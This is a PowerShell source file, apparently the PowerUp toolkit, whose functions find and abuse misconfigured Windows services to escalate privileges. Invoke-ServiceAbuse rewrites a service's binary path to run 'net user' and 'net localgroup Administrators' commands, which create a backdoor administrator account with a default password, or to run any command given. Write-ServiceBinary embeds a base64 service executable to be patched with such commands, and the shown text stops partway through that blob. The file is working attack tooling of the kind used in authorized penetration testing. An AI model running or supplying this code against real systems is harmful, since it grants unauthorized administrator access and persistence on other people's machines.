<#
    PowerUp aims to be a clearinghouse of common Windows privilege escalation
    vectors that rely on misconfigurations. See README.md for more information.

    Author: @harmj0y
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
#>


########################################################
#
# Helpers
#
########################################################

Add-Type @"
  [System.FlagsAttribute]
  public enum ServiceAccessFlags : uint
  {
      CC = 1,
      DC = 2,
      LC = 4,
      SW = 8,
      RP = 16,
      WP = 32,
      DT = 64,
      LO = 128,
      CR = 256,
      SD = 65536,
      RC = 131072,
      WD = 262144,
      WO = 524288,
      GA = 268435456,
      GX = 536870912,
      GW = 1073741824,
      GR = 2147483648
  }
"@

function Get-ModifiableFile {
<#
    .SYNOPSIS

        Helper to return any modifiable file that's a part of a passed string.
        
    .EXAMPLE

        PS C:\> '"C:\Temp\blah.bat" -f "C:\Temp\config.ini"' | Get-ModifiableFile

        Return the paths "C:\Temp\blah.bat" or "C:\Temp\config.ini" if they are
        modifable by the current user context.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $Path
    )

    begin {
        # false positives
        $Excludes = @("MsMpEng.exe", "NisSrv.exe")

        $OrigError = $ErrorActionPreference
        $ErrorActionPreference = "SilentlyContinue"
    }

    process {
        $CandidateFiles = @()

        # test for quote-enclosed args first, returning files that exist on the system
        $CandidateFiles += $Path.split("`"'") | Where-Object { $_ -and (Test-Path $_) }

        # now check for space-separated args, returning files that exist on the system
        $CandidateFiles += $Path.split() | Where-Object { $_ -and (Test-Path $_) }
        
        # see if we need to skip any excludes
        $CandidateFiles | Sort-Object -Unique | Where-Object {$_} | Where-Object {
            $Skip = $False
            ForEach($Exclude in $Excludes) {
                if($_ -match $Exclude) { $Skip = $True }
            }
            if(!$Skip) {$True}
        } | ForEach-Object {

            try {
                # expand any %VARS%
                $FilePath = [System.Environment]::ExpandEnvironmentVariables($_)
                
                # try to open the file for writing, immediately closing it
                $File = Get-Item -Path $FilePath -Force
                $Stream = $File.OpenWrite()
                $Null = $Stream.Close()
                $FilePath
            }
            catch {}
        }
    }

    end {
        $ErrorActionPreference = $OrigError
    }
}

function Test-ServiceDaclPermission {
<#
    .SYNOPSIS

        This function checks if the current user has specific DACL permissions 
        for a specific service with the aid of 'sc.exe sdshow'.

    .PARAMETER ServiceName

        The service name to verify the permissions against. Required.

    .PARAMETER Dacl

        The DACL permissions. Required.
  
    .EXAMPLE

        PS C:\> Test-ServiceDaclPermission -ServiceName VulnSVC -Dacl WPRPDC

        Return $True if the current user has Stop (WP), Start (RP),
        and ChangeConf (DC) service permissions for 'VulnSVC' otherwise return $False.

    .LINK

        https://support.microsoft.com/en-us/kb/914392
        https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
#>

    [CmdletBinding()]
        Param(
            [Parameter(Mandatory = $True)]
            [string]
            $ServiceName,

            [Parameter(Mandatory = $True)]
            [string]
            $Dacl
        )

    # check if sc.exe exists
    if (-not (Test-Path ("$env:SystemRoot\system32\sc.exe"))){ 
        Write-Warning "[!] Could not find $env:SystemRoot\system32\sc.exe"
        return $False
    }

    # query WMI for the service
    $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
        
    # make sure we got a result back
    if (-not ($TargetService)){
        Write-Warning "[!] Target service '$ServiceName' not found on the machine"
        return $False
    }

    try {
        # retrieve DACL from sc.exe
        $Result = sc.exe sdshow $TargetService.Name | where {$_}

        if ($Result -like "*OpenService FAILED*"){
                Write-Warning "[!] Access to service $($TargetService.Name) denied"
                return $False
        }

        $SecurityDescriptors = New-Object System.Security.AccessControl.RawSecurityDescriptor($Result)

        # populate a list of group SIDs that the current user is a member of
        $Sids = whoami /groups /FO csv | ConvertFrom-Csv | select "SID" | ForEach-Object {$_.Sid}

        # add to the list the SID of the current user
        $Sids += [System.Security.Principal.WindowsIdentity]::GetCurrent().User.value

        ForEach ($Sid in $Sids){
            ForEach ($Ace in $SecurityDescriptors.DiscretionaryAcl){   
            
                # check if the group/user SID is included in the ACE 
                if ($Sid -eq $Ace.SecurityIdentifier){
                
                    # convert the AccessMask to a service DACL string
                    $DaclString = [string]([ServiceAccessFlags] $Ace.AccessMask) -replace ', ',''
                
                    # convert the input DACL to an array
                    $DaclArray = [array] ($Dacl -split '(.{2})' | Where-Object {$_})
                
                    # counter to check how many DACL permissions were found
                    $MatchedPermissions = 0
                
                    # check if each of the permissions exists
                    ForEach ($DaclPermission in $DaclArray){
                        if ($DaclString.Contains($DaclPermission.ToUpper())){
                            $MatchedPermissions += 1
                        }
                        else{
                            break
                        }
                    }
                    # found all permissions - success
                    if ($MatchedPermissions-eq $DaclArray.Count){
                        return $True
                    }
                }  
            }
        }
        return $False
    }
    catch{
        Write-Warning "Error: $_"
        return $False
    }
}

function Invoke-ServiceStart {
<#
    .SYNOPSIS

        Starts a specified service, first enabling the service if it was marked as disabled.

    .PARAMETER ServiceName

        The service name to start. Required.

    .EXAMPLE

        PS C:\> Invoke-ServiceStart -ServiceName VulnSVC

        Start the 'VulnSVC' service.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName
    )

    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
        
        # make sure we got a result back
        if (-not ($TargetService)){
            Write-Warning "[!] Target service '$ServiceName' not found on the machine"
            return $False
        }
            
        try {
            # enable the service if it was marked as disabled
            if ($TargetService.StartMode -eq "Disabled"){
                $r = Invoke-ServiceEnable -ServiceName "$($TargetService.Name)"
                if (-not $r){ 
                    return $False 
                }
            }

            # start the service
            Write-Verbose "Starting service '$($TargetService.Name)'"
            $Null = sc.exe start "$($TargetService.Name)"

            Start-Sleep -s .5
            return $True
        }
        catch{
            Write-Warning "Error: $_"
            return $False
        }
    }
}


function Invoke-ServiceStop {
<#
    .SYNOPSIS

        Stops a specified service.

    .PARAMETER ServiceName

        The service name to stop. Required.
        
    .EXAMPLE

        PS C:\> Invoke-ServiceStop -ServiceName VulnSVC

        Stop the 'VulnSVC' service.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName
    )

    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if (-not ($TargetService)){
            Write-Warning "[!] Target service '$ServiceName' not found on the machine"
            return $False
        }

        try {
            # stop the service
            Write-Verbose "Stopping service '$($TargetService.Name)'"
            $Result = sc.exe stop "$($TargetService.Name)"

            if ($Result -like "*Access is denied*"){
                Write-Warning "[!] Access to service $($TargetService.Name) denied"
                return $False
            }
            elseif ($Result -like "*1051*") {
                # if we can't stop the service because other things depend on it
                Write-Warning "[!] Stopping service $($TargetService.Name) failed: $Result"
                return $False
            }

            Start-Sleep 1
            return $True
        }
        catch{
            Write-Warning "Error: $_"
            return $False
        }
    }
}


function Invoke-ServiceEnable {
<#
    .SYNOPSIS

        Enables a specified service.

    .PARAMETER ServiceName

        The service name to enable. Required.
        
    .EXAMPLE

        PS C:\> Invoke-ServiceEnable -ServiceName VulnSVC

        Enables the 'VulnSVC' service.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName
    )

    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if (-not ($TargetService)){
            Write-Warning "[!] Target service '$ServiceName' not found on the machine"
            return $False
        }
        
        try {
            # enable the service
            Write-Verbose "Enabling service '$TargetService.Name'"
            $Null = sc.exe config "$($TargetService.Name)" start= demand
            return $True
        }
        catch{
            Write-Warning "Error: $_"
            return $False
        }
    }
}


function Invoke-ServiceDisable {
<#
    .SYNOPSIS

        Disables a specified service.

    .PARAMETER ServiceName

        The service name to disable. Required.
    
    .EXAMPLE

        PS C:\> Invoke-ServiceDisable -ServiceName VulnSVC

        Disables the 'VulnSVC' service.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName
    )
    
    process {
        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if (-not ($TargetService)){
            Write-Warning "[!] Target service '$ServiceName' not found on the machine"
            return $False
        }
        
        try {
            # disable the service
            Write-Verbose "Disabling service '$TargetService.Name'"
            $Null = sc.exe config "$($TargetService.Name)" start= disabled
            return $True
        }
        catch{
            Write-Warning "Error: $_"
            return $False
        }
    }
}


########################################################
#
# Service enumeration
#
########################################################

function Get-ServiceUnquoted {
<#
    .SYNOPSIS

        Returns the name and binary path for services with unquoted paths
        that also have a space in the name.
        
    .EXAMPLE

        PS C:\> $services = Get-ServiceUnquoted
        
        Get a set of potentially exploitable services.

    .LINK
      
        https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/trusted_service_path.rb
#>

    # find all paths to service .exe's that have a space in the path and aren't quoted
    $VulnServices = Get-WmiObject -Class win32_service | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | Where-Object {-not $_.pathname.StartsWith("`"")} | Where-Object {-not $_.pathname.StartsWith("'")} | Where-Object {($_.pathname.Substring(0, $_.pathname.IndexOf(".exe") + 4)) -match ".* .*"}
    
    if ($VulnServices) {
        ForEach ($Service in $VulnServices){
            $Out = New-Object PSObject 
            $Out | Add-Member Noteproperty 'ServiceName' $Service.name
            $Out | Add-Member Noteproperty 'Path' $Service.pathname
            $Out | Add-Member Noteproperty 'StartName' $Service.startname
            $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -ServiceName '$($Service.name)' -Path <HijackPath>"
            $Out
        }
    }
}


function Get-ServiceFilePermission {
<#
    .SYNOPSIS

        This function finds all services where the current user can 
        write to the associated binary or its arguments. 
        If the associated binary (or config file) is overwritten, 
        privileges may be able to be escalated.
        
    .EXAMPLE

        PS C:\> Get-ServiceFilePermission

        Get a set of potentially exploitable service binares/config files.
#>
    
    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {

        $ServiceName = $_.name
        $ServicePath = $_.pathname
        $ServiceStartName = $_.startname

        $ServicePath | Get-ModifiableFile | ForEach-Object {
            $Out = New-Object PSObject 
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
            $Out | Add-Member Noteproperty 'Path' $ServicePath
            $Out | Add-Member Noteproperty 'ModifiableFile' $_
            $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
            $Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinary -ServiceName '$ServiceName'"
            $Out
        }
    }
}


function Get-ServicePermission {
<#
    .SYNOPSIS

        This function enumerates all available services and tries to
        open the service for modification, returning the service object
        if the process doesn't failed.
    
    .EXAMPLE

        PS C:\> Get-ServicePermission

        Get a set of potentially exploitable services.
#>
    
    # check if sc.exe exists
    if (-not (Test-Path ("$Env:SystemRoot\System32\sc.exe"))) { 
        Write-Warning "[!] Could not find $Env:SystemRoot\System32\sc.exe"
        
        $Out = New-Object PSObject 
        $Out | Add-Member Noteproperty 'ServiceName' 'Not Found'
        $Out | Add-Member Noteproperty 'Path' "$Env:SystemRoot\System32\sc.exe"
        $Out | Add-Member Noteproperty 'StartName' $Null
        $Out | Add-Member Noteproperty 'AbuseFunction' $Null
        $Out
    }

    $Services = Get-WmiObject -Class win32_service | Where-Object {$_}
    
    if ($Services) {
        ForEach ($Service in $Services){

            # try to change error control of a service to its existing value
            $Result = sc.exe config $($Service.Name) error= $($Service.ErrorControl)

            # means the change was successful
            if ($Result -contains "[SC] ChangeServiceConfig SUCCESS"){
                $Out = New-Object PSObject 
                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                $Out | Add-Member Noteproperty 'Path' $Service.pathname
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -ServiceName '$($Service.name)'"
                $Out
            }
        }
    }
}


function Get-ServiceDetail {
<#
    .SYNOPSIS

        Returns detailed information about a specified service.

    .PARAMETER ServiceName

        The service name to query for. Required.

    .EXAMPLE

        PS C:\> Get-ServiceDetail -ServiceName VulnSVC

        Gets detailed information about the 'VulnSVC' service.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName
    )

    process {
        Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_} | ForEach-Object {
            try {
                $_ | Format-List *
            }
            catch{
                Write-Warning "Error: $_"
                $null
            }            
        }
    }
}


########################################################
#
# Service abuse
#
########################################################

function Invoke-ServiceAbuse {
<#
    .SYNOPSIS

        This function stops a service, modifies it to create a user, starts
        the service, stops it, modifies it to add the user to the specified group,
        stops it, and then restores the original EXE path. It can also take a 
        custom -CMD argument to trigger a custom command instead of adding a user.
        
    .PARAMETER ServiceName

        The service name to manipulate. Required.

    .PARAMETER UserName

        The [domain\]username to add. If not given, it defaults to "john".
        Domain users are not created, only added to the specified localgroup.

    .PARAMETER Password

        The password to set for the added user. If not given, it defaults to "Password123!"

    .PARAMETER LocalGroup

        Local group name to add the user to (default of Administrators).
    
    .PARAMETER Command
    
        Custom local command to execute.

    .EXAMPLE

        PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC

        Abuses service 'VulnSVC' to add a localuser "john" with password 
        "Password123! to the  machine and local administrator group

    .EXAMPLE

        PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC -UserName "TESTLAB\john"

        Abuses service 'VulnSVC' to add a the domain user TESTLAB\john to the
        local adminisrtators group.

    .EXAMPLE

        PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup "Power Users"

        Abuses service 'VulnSVC' to add a localuser "backdoor" with password 
        "password" to the  machine and local "Power Users" group

    .EXAMPLE

        PS C:\> Invoke-ServiceAbuse -ServiceName VulnSVC -Command "net ..."

        Abuses service 'VulnSVC' to execute a custom command.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName,

        [String]
        $UserName = "john",

        [String]
        $Password = "Password123!",

        [String]
        $LocalGroup = "Administrators",

        [String]
        $Command
    )

    process {

        # query WMI for the service
        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}

        # make sure we got a result back
        if ($TargetService) {

            $ServiceAbused = $TargetService.Name
            $UserAdded = $Null
            $PasswordAdded = $Null
            $GroupnameAdded = $Null

            try {
                # check if sc.exe exists
                if (-not (Test-Path ("$Env:SystemRoot\System32\sc.exe"))){ 
                    throw "Could not find $Env:SystemRoot\System32\sc.exe"
                }

                # try to enable the service it was disabled
                $RestoreDisabled = $False
                if ($TargetService.StartMode -eq "Disabled") {
                    Write-Verbose "Service '$ServiceName' disabled, enabling..."
                    if(-not $(Invoke-ServiceEnable -ServiceName $ServiceName)) {
                        throw "Error in enabling disabled service."
                    }
                    $RestoreDisabled = $True
                }

                # extract the original path and state so we can restore it later
                $OriginalPath = $TargetService.PathName
                $OriginalState = $TargetService.State
                Write-Verbose "Service '$ServiceName' original path: '$OriginalPath'"
                Write-Verbose "Service '$ServiceName' original state: '$OriginalState'"

                $Commands = @()

                if($Command) {
                    # only executing a custom command
                    $Commands += $Command
                }
                elseif($UserName.Contains("\")) {
                    # adding a domain user to the local group, no creation
                    $Commands += "net localgroup $LocalGroup $UserName /add"
                }
                else {
                    # creating a local user and adding to the local group
                    $Commands += "net user $UserName $Password /add"
                    $Commands += "net localgroup $LocalGroup $UserName /add"
                }

                foreach($Cmd in $Commands) {
                    if(-not $(Invoke-ServiceStop -ServiceName $TargetService.Name)) {
                        throw "Error in stopping service."
                    }

                    Write-Verbose "Executing command '$Cmd'"

                    $Result = sc.exe config $($TargetService.Name) binPath= $Cmd
                    if ($Result -contains "Access is denied."){
                        throw "Access to service $($TargetService.Name) denied"
                    }

                    $Null = Invoke-ServiceStart -ServiceName $TargetService.Name
                }
 
                # cleanup and restore the original binary path
                Write-Verbose "Restoring original path to service '$ServiceName'"
                $Null = sc.exe config $($TargetService.Name) binPath= $OriginalPath

                # try to restore the service to whatever state it was
                if($RestoreDisabled) {
                    Write-Verbose "Re-disabling service '$ServiceName'"
                    $Result = sc.exe config $($TargetService.Name) start= disabled
                }
                elseif($OriginalState -eq "Paused") {
                    Write-Verbose "Starting and then pausing service '$ServiceName'"
                    $Null = Invoke-ServiceStart -ServiceName  $TargetService.Name
                    $Null = sc.exe pause $($TargetService.Name)
                }
                elseif($OriginalState -eq "Stopped") {
                    Write-Verbose "Leaving service '$ServiceName' in stopped state"
                }
                else {
                    $Null = Invoke-ServiceStart -ServiceName  $TargetService.Name
                }
            }
            catch {
                Write-Warning "Error while modifying service '$ServiceName': $_"
                $Commands = @("Error while modifying service '$ServiceName': $_")
            }
        }

        else {
            Write-Warning "Target service '$ServiceName' not found on the machine"
            $Commands = "Not found"
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceAbused' $ServiceAbused
        $Out | Add-Member Noteproperty 'Command' $($Commands -join " && ")
        $Out
    }
}


function Write-ServiceBinary {
<#
    .SYNOPSIS

        Takes a precompiled C# service executable and binary patches in a 
        custom shell command or commands to add a local administrator.
        It then writes the binary out to the specified location.
        Domain users are only added to the specified LocalGroup.
        
    .PARAMETER ServiceName

        The service name the EXE will be running under. Required.

    .PARAMETER Path

        Path to write the binary out to, defaults to the local directory.

    .PARAMETER UserName

        The [DOMAIN\username] to add, defaults to 'john'.

    .PARAMETER Password

        The password to set for the added user, default to 'Password123!'.

    .PARAMETER LocalGroup

        Local group to add the user to, defaults to 'Administrators'.

    .PARAMETER Command

        A custom command to execute.

    .EXAMPLE

        PS C:\> Write-ServiceBinary -ServiceName VulnSVC

        Writes the service binary for VulnSVC that adds a local administrator
        to the local directory.

    .EXAMPLE

        PS C:\> Write-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"

        Writes the service binary for VulnSVC that adds TESTLAB\john to the local
        administrators to the local directory.

    .EXAMPLE

        PS C:\> Write-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!

        Writes the service binary for VulnSVC that adds a local administrator of
        name 'backdoor' with password 'Password123!' to the local directory.

    .EXAMPLE

        PS C:\> Write-ServiceBinary -ServiceName VulnSVC -Command "net ..."

        Writes the service binary for VulnSVC that executes a local command
        to the local directory.
#>

    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [String]
        $ServiceName,

        [String]
        $ServicePath = "service.exe",

        [String]
        $UserName = "john",

        [String]
        $Password = "Password123!",

        [String]
        $LocalGroup = "Administrators",

        [String]
        $Command
    )

    begin {
        # the raw unpatched service binary
        $B64Binary = "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UmVmbGVjdGlvbgBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlDdWx0dXJlQXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBDb21WaXNpYmxlQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUAQXNzZW1ibHlWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAU3lzdGVtLkRpYWdub3N0aWNzAERlYnVnZ2FibGVBdHRyaWJ1dGUARGVidWdnaW5nTW9kZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAElEaXNwb3NhYmxlAENvbnRhaW5lcgBTdHJpbmcAVHJpbQBzZXRfU2VydmljZU5hbWUAUHJvY2VzcwBTdGFydABTeXN0ZW0uVGhyZWFkaW5nAFRocmVhZABTbGVlcABFbnZpcm9ubWVudABFeGl0AFJ1bgAARUEAQQBBACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAAL/3LwBDACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIA